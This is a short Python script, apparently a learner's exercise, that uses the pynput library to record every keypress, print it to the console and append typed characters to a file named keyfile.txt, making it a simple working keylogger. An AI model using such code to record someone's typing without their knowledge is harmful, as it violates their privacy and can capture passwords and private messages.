from pynput import keyboard

def keyPressed(key):
    print(str(key))  # Print the pressed key to the console
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()  # Corrected function call
    listener.join()  # Keeps the program running
